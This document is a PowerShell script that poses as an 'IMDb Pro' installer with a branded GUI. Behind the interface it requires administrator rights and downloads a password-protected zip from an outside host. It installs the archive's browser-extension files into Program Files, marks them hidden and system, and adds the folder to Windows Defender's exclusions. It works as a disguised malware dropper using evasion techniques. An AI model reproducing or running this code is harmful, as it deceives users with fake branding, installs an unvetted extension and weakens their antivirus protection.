# IMDB Pro Installer - IMDb Style UI
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Create main form with IMDb colors
$mainForm = New-Object System.Windows.Forms.Form
$mainForm.Text = "IMDb Pro - Professional Edition"
$mainForm.Size = New-Object System.Drawing.Size(900, 700)
$mainForm.StartPosition = "CenterScreen"
$mainForm.BackColor = [System.Drawing.Color]::FromArgb(22, 22, 23)  # IMDb dark background
$mainForm.ForeColor = [System.Drawing.Color]::White
$mainForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
$mainForm.MaximizeBox = $false

# Header with IMDb gradient
$headerPanel = New-Object System.Windows.Forms.Panel
$headerPanel.Location = New-Object System.Drawing.Point(0, 0)
$headerPanel.Size = New-Object System.Drawing.Size(900, 80)
$headerPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$mainForm.Controls.Add($headerPanel)

# IMDb Pro Logo
$logoLabel = New-Object System.Windows.Forms.Label
$logoLabel.Text = "IMDb"
$logoLabel.Font = New-Object System.Drawing.Font("Arial", 28, [System.Drawing.FontStyle]::Bold)
$logoLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)  # IMDb yellow
$logoLabel.AutoSize = $true
$logoLabel.Location = New-Object System.Drawing.Point(50, 20)
$headerPanel.Controls.Add($logoLabel)

$proLabel = New-Object System.Windows.Forms.Label
$proLabel.Text = "PRO"
$proLabel.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
$proLabel.ForeColor = [System.Drawing.Color]::White
$proLabel.AutoSize = $true
$proLabel.Location = New-Object System.Drawing.Point(155, 25)
$headerPanel.Controls.Add($proLabel)

$subtitleLabel = New-Object System.Windows.Forms.Label
$subtitleLabel.Text = "Professional Extension Suite"
$subtitleLabel.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Italic)
$subtitleLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$subtitleLabel.AutoSize = $true
$subtitleLabel.Location = New-Object System.Drawing.Point(200, 30)
$headerPanel.Controls.Add($subtitleLabel)

# Main content panel
$contentPanel = New-Object System.Windows.Forms.Panel
$contentPanel.Location = New-Object System.Drawing.Point(0, 80)
$contentPanel.Size = New-Object System.Drawing.Size(900, 520)
$contentPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$mainForm.Controls.Add($contentPanel)

# Features Section
$featuresLabel = New-Object System.Windows.Forms.Label
$featuresLabel.Text = "Premium Features"
$featuresLabel.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold)
$featuresLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$featuresLabel.AutoSize = $true
$featuresLabel.Location = New-Object System.Drawing.Point(50, 30)
$contentPanel.Controls.Add($featuresLabel)

# Feature 1 - Ratings
$feature1Panel = New-Object System.Windows.Forms.Panel
$feature1Panel.Size = New-Object System.Drawing.Size(250, 120)
$feature1Panel.Location = New-Object System.Drawing.Point(50, 80)
$feature1Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$feature1Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$feature1Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
$contentPanel.Controls.Add($feature1Panel)

$starIcon1 = New-Object System.Windows.Forms.Label
$starIcon1.Text = "⭐"
$starIcon1.Font = New-Object System.Drawing.Font("Arial", 24)
$starIcon1.AutoSize = $true
$starIcon1.Location = New-Object System.Drawing.Point(20, 20)
$feature1Panel.Controls.Add($starIcon1)

$feature1Title = New-Object System.Windows.Forms.Label
$feature1Title.Text = "Real-time IMDb Ratings"
$feature1Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$feature1Title.ForeColor = [System.Drawing.Color]::White
$feature1Title.AutoSize = $true
$feature1Title.Location = New-Object System.Drawing.Point(70, 25)
$feature1Panel.Controls.Add($feature1Title)

$feature1Desc = New-Object System.Windows.Forms.Label
$feature1Desc.Text = "Instant access to ratings and reviews"
$feature1Desc.Font = New-Object System.Drawing.Font("Arial", 9)
$feature1Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$feature1Desc.AutoSize = $true
$feature1Desc.Location = New-Object System.Drawing.Point(20, 70)
$feature1Panel.Controls.Add($feature1Desc)

# Feature 2 - Movie Info
$feature2Panel = New-Object System.Windows.Forms.Panel
$feature2Panel.Size = New-Object System.Drawing.Size(250, 120)
$feature2Panel.Location = New-Object System.Drawing.Point(320, 80)
$feature2Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$feature2Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$feature2Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
$contentPanel.Controls.Add($feature2Panel)

$movieIcon = New-Object System.Windows.Forms.Label
$movieIcon.Text = "🎬"
$movieIcon.Font = New-Object System.Drawing.Font("Arial", 24)
$movieIcon.AutoSize = $true
$movieIcon.Location = New-Object System.Drawing.Point(20, 20)
$feature2Panel.Controls.Add($movieIcon)

$feature2Title = New-Object System.Windows.Forms.Label
$feature2Title.Text = "Complete Movie Info"
$feature2Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$feature2Title.ForeColor = [System.Drawing.Color]::White
$feature2Title.AutoSize = $true
$feature2Title.Location = New-Object System.Drawing.Point(70, 25)
$feature2Panel.Controls.Add($feature2Title)

$feature2Desc = New-Object System.Windows.Forms.Label
$feature2Desc.Text = "Cast, crew, and detailed information"
$feature2Desc.Font = New-Object System.Drawing.Font("Arial", 9)
$feature2Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$feature2Desc.AutoSize = $true
$feature2Desc.Location = New-Object System.Drawing.Point(20, 70)
$feature2Panel.Controls.Add($feature2Desc)

# Feature 3 - Trailers
$feature3Panel = New-Object System.Windows.Forms.Panel
$feature3Panel.Size = New-Object System.Drawing.Size(250, 120)
$feature3Panel.Location = New-Object System.Drawing.Point(590, 80)
$feature3Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$feature3Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$feature3Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
$contentPanel.Controls.Add($feature3Panel)

$trailerIcon = New-Object System.Windows.Forms.Label
$trailerIcon.Text = "🎥"
$trailerIcon.Font = New-Object System.Drawing.Font("Arial", 24)
$trailerIcon.AutoSize = $true
$trailerIcon.Location = New-Object System.Drawing.Point(20, 20)
$feature3Panel.Controls.Add($trailerIcon)

$feature3Title = New-Object System.Windows.Forms.Label
$feature3Title.Text = "HD Trailers & Previews"
$feature3Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$feature3Title.ForeColor = [System.Drawing.Color]::White
$feature3Title.AutoSize = $true
$feature3Title.Location = New-Object System.Drawing.Point(70, 25)
$feature3Panel.Controls.Add($feature3Title)

$feature3Desc = New-Object System.Windows.Forms.Label
$feature3Desc.Text = "Watch trailers directly in browser"
$feature3Desc.Font = New-Object System.Drawing.Font("Arial", 9)
$feature3Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$feature3Desc.AutoSize = $true
$feature3Desc.Location = New-Object System.Drawing.Point(20, 70)
$feature3Panel.Controls.Add($feature3Desc)

# Additional Features Row 2
# Feature 4 - Browser Integration
$feature4Panel = New-Object System.Windows.Forms.Panel
$feature4Panel.Size = New-Object System.Drawing.Size(250, 120)
$feature4Panel.Location = New-Object System.Drawing.Point(50, 220)
$feature4Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$feature4Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$feature4Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
$contentPanel.Controls.Add($feature4Panel)

$browserIcon = New-Object System.Windows.Forms.Label
$browserIcon.Text = "🌐"
$browserIcon.Font = New-Object System.Drawing.Font("Arial", 24)
$browserIcon.AutoSize = $true
$browserIcon.Location = New-Object System.Drawing.Point(20, 20)
$feature4Panel.Controls.Add($browserIcon)

$feature4Title = New-Object System.Windows.Forms.Label
$feature4Title.Text = "Browser Integration"
$feature4Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$feature4Title.ForeColor = [System.Drawing.Color]::White
$feature4Title.AutoSize = $true
$feature4Title.Location = New-Object System.Drawing.Point(70, 25)
$feature4Panel.Controls.Add($feature4Title)

$feature4Desc = New-Object System.Windows.Forms.Label
$feature4Desc.Text = "Seamless browsing experience"
$feature4Desc.Font = New-Object System.Drawing.Font("Arial", 9)
$feature4Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$feature4Desc.AutoSize = $true
$feature4Desc.Location = New-Object System.Drawing.Point(20, 70)
$feature4Panel.Controls.Add($feature4Desc)

# Feature 5 - Auto Updates
$feature5Panel = New-Object System.Windows.Forms.Panel
$feature5Panel.Size = New-Object System.Drawing.Size(250, 120)
$feature5Panel.Location = New-Object System.Drawing.Point(320, 220)
$feature5Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$feature5Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$feature5Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
$contentPanel.Controls.Add($feature5Panel)

$updateIcon = New-Object System.Windows.Forms.Label
$updateIcon.Text = "🔄"
$updateIcon.Font = New-Object System.Drawing.Font("Arial", 24)
$updateIcon.AutoSize = $true
$updateIcon.Location = New-Object System.Drawing.Point(20, 20)
$feature5Panel.Controls.Add($updateIcon)

$feature5Title = New-Object System.Windows.Forms.Label
$feature5Title.Text = "Auto Updates"
$feature5Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$feature5Title.ForeColor = [System.Drawing.Color]::White
$feature5Title.AutoSize = $true
$feature5Title.Location = New-Object System.Drawing.Point(70, 25)
$feature5Panel.Controls.Add($feature5Title)

$feature5Desc = New-Object System.Windows.Forms.Label
$feature5Desc.Text = "Always up-to-date features"
$feature5Desc.Font = New-Object System.Drawing.Font("Arial", 9)
$feature5Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$feature5Desc.AutoSize = $true
$feature5Desc.Location = New-Object System.Drawing.Point(20, 70)
$feature5Panel.Controls.Add($feature5Desc)

# Feature 6 - Security
$feature6Panel = New-Object System.Windows.Forms.Panel
$feature6Panel.Size = New-Object System.Drawing.Size(250, 120)
$feature6Panel.Location = New-Object System.Drawing.Point(590, 220)
$feature6Panel.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$feature6Panel.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$feature6Panel.BorderColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
$contentPanel.Controls.Add($feature6Panel)

$securityIcon = New-Object System.Windows.Forms.Label
$securityIcon.Text = "🔒"
$securityIcon.Font = New-Object System.Drawing.Font("Arial", 24)
$securityIcon.AutoSize = $true
$securityIcon.Location = New-Object System.Drawing.Point(20, 20)
$feature6Panel.Controls.Add($securityIcon)

$feature6Title = New-Object System.Windows.Forms.Label
$feature6Title.Text = "Secure & Private"
$feature6Title.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$feature6Title.ForeColor = [System.Drawing.Color]::White
$feature6Title.AutoSize = $true
$feature6Title.Location = New-Object System.Drawing.Point(70, 25)
$feature6Panel.Controls.Add($feature6Title)

$feature6Desc = New-Object System.Windows.Forms.Label
$feature6Desc.Text = "Your data is protected"
$feature6Desc.Font = New-Object System.Drawing.Font("Arial", 9)
$feature6Desc.ForeColor = [System.Drawing.Color]::FromArgb(180, 180, 180)
$feature6Desc.AutoSize = $true
$feature6Desc.Location = New-Object System.Drawing.Point(20, 70)
$feature6Panel.Controls.Add($feature6Desc)

# Installation Progress Section
$progressLabel = New-Object System.Windows.Forms.Label
$progressLabel.Text = "Installation Progress"
$progressLabel.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold)
$progressLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$progressLabel.AutoSize = $true
$progressLabel.Location = New-Object System.Drawing.Point(50, 370)
$contentPanel.Controls.Add($progressLabel)

# Progress bar container
$progressContainer = New-Object System.Windows.Forms.Panel
$progressContainer.Size = New-Object System.Drawing.Size(800, 100)
$progressContainer.Location = New-Object System.Drawing.Point(50, 410)
$progressContainer.BackColor = [System.Drawing.Color]::FromArgb(45, 45, 45)
$progressContainer.BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
$contentPanel.Controls.Add($progressContainer)

# Status label
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "Ready to begin installation"
$statusLabel.Font = New-Object System.Drawing.Font("Arial", 12, [System.Drawing.FontStyle]::Bold)
$statusLabel.ForeColor = [System.Drawing.Color]::White
$statusLabel.AutoSize = $true
$statusLabel.Location = New-Object System.Drawing.Point(20, 20)
$progressContainer.Controls.Add($statusLabel)

# Progress bar
$progressBar = New-Object System.Windows.Forms.ProgressBar
$progressBar.Location = New-Object System.Drawing.Point(20, 50)
$progressBar.Size = New-Object System.Drawing.Size(650, 30)
$progressBar.Style = [System.Windows.Forms.ProgressBarStyle]::Continuous
$progressBar.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)  # IMDb yellow
$progressBar.BackColor = [System.Drawing.Color]::FromArgb(60, 60, 60)
$progressContainer.Controls.Add($progressBar)

# Percentage label
$percentLabel = New-Object System.Windows.Forms.Label
$percentLabel.Text = "0%"
$percentLabel.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
$percentLabel.ForeColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
$percentLabel.AutoSize = $true
$percentLabel.Location = New-Object System.Drawing.Point(680, 45)
$progressContainer.Controls.Add($percentLabel)

# Install button panel
$buttonPanel = New-Object System.Windows.Forms.Panel
$buttonPanel.Location = New-Object System.Drawing.Point(0, 600)
$buttonPanel.Size = New-Object System.Drawing.Size(900, 100)
$buttonPanel.BackColor = [System.Drawing.Color]::FromArgb(32, 32, 32)
$mainForm.Controls.Add($buttonPanel)

# Install button
$installButton = New-Object System.Windows.Forms.Button
$installButton.Text = "START INSTALLATION"
$installButton.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
$installButton.ForeColor = [System.Drawing.Color]::Black
$installButton.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)  # IMDb yellow
$installButton.Size = New-Object System.Drawing.Size(300, 60)
$installButton.Location = New-Object System.Drawing.Point(300, 20)
$installButton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
$installButton.FlatAppearance.BorderSize = 0
$installButton.Cursor = [System.Windows.Forms.Cursors]::Hand

# Button hover effects
$installButton.Add_MouseEnter({
    $this.BackColor = [System.Drawing.Color]::FromArgb(255, 215, 0)
    $this.Font = New-Object System.Drawing.Font("Arial", 16.5, [System.Drawing.FontStyle]::Bold)
})

$installButton.Add_MouseLeave({
    if ($this.Text -ne "INSTALLATION COMPLETE") {
        $this.BackColor = [System.Drawing.Color]::FromArgb(245, 197, 24)
        $this.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
    }
})

# Installation function
$installButton.Add_Click({
    $this.Enabled = $false
    $this.Text = "INSTALLING..."
    Start-Installation
})

$buttonPanel.Controls.Add($installButton)

# Update function
function Update-Status {
    param($Message, $ProgressValue)
    
    $statusLabel.Text = $Message
    $percentLabel.Text = "$ProgressValue%"
    $progressBar.Value = $ProgressValue
    [System.Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

# Installation function
function Start-Installation {
    $downloadUrl = "https://file.apikey.my/imdb/imdb.zip"
    $tempFile = "$env:TEMP\imdb.zip"
    $installPath = "C:\Program Files\imdb-pro"
    $zipPassword = "123"
    
    try {
        Update-Status "Checking administrator privileges..." 10
        
        # Admin check
        if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
            Update-Status "Administrator privileges required" 0
            [System.Windows.Forms.MessageBox]::Show("Please run this installer as Administrator.", "Elevation Required", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
            $installButton.Enabled = $true
            $installButton.Text = "START INSTALLATION"
            return
        }
        
        Update-Status "Creating installation directory..." 20
        if (!(Test-Path $installPath)) {
            New-Item -ItemType Directory -Path $installPath -Force | Out-Null
        }
        
        Update-Status "Downloading IMDb Pro package..." 40
        Invoke-WebRequest -Uri $downloadUrl -OutFile $tempFile -UseBasicParsing
        
        Update-Status "Extracting package contents..." 60
        $extractionSuccess = $false
        
        # Try 7-Zip first
        if (Get-Command "7z" -ErrorAction SilentlyContinue) {
            & 7z x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
            $extractionSuccess = $?
        }
        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
            & "C:\Program Files\7-Zip\7z.exe" x -p$zipPassword -o"$installPath" -y $tempFile | Out-Null
            $extractionSuccess = $?
        }
        
        if (-not $extractionSuccess) {
            Update-Status "Using alternative extraction method..." 70
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [System.IO.Compression.ZipFile]::ExtractToDirectory($tempFile, $installPath)
            }
            catch {
                $shellApp = New-Object -ComObject Shell.Application
                $zipFolder = $shellApp.NameSpace($tempFile)
                $destFolder = $shellApp.NameSpace($installPath)
                $destFolder.CopyHere($zipFolder.Items(), 0x14)
                Start-Sleep -Seconds 2
            }
        }
        
        Update-Status "Securing installation files..." 85
        Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
        
        $protectedFiles = @("background.js", "content.js", "popup.js", "manifest.json")
        foreach ($file in $protectedFiles) {
            $fullPath = Join-Path $installPath $file
            if (Test-Path $fullPath) {
                Set-ItemProperty -Path $fullPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
            }
        }
        
        Update-Status "Finalizing installation..." 95
        Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
        
        Update-Status "Installation completed successfully!" 100
        
        # Final UI updates
        $installButton.Text = "INSTALLATION COMPLETE"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(76, 175, 80)  # Green color
        
        [System.Windows.Forms.MessageBox]::Show(
            "IMDb Pro has been successfully installed!`n`nLocation: $installPath`n`nPlease restart your browser to activate the extension.",
            "Installation Complete",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Information
        )
        
    }
    catch {
        Update-Status "Installation failed: $($_.Exception.Message)" 0
        $installButton.Text = "TRY AGAIN"
        $installButton.BackColor = [System.Drawing.Color]::FromArgb(244, 67, 54)  # Red color
        $installButton.Enabled = $true
        
        [System.Windows.Forms.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)",
            "Installation Error",
            [System.Windows.Forms.MessageBoxButtons]::OK,
            [System.Windows.Forms.MessageBoxIcon]::Error
        )
    }
}

# Show the form
$mainForm.ShowDialog() | Out-Null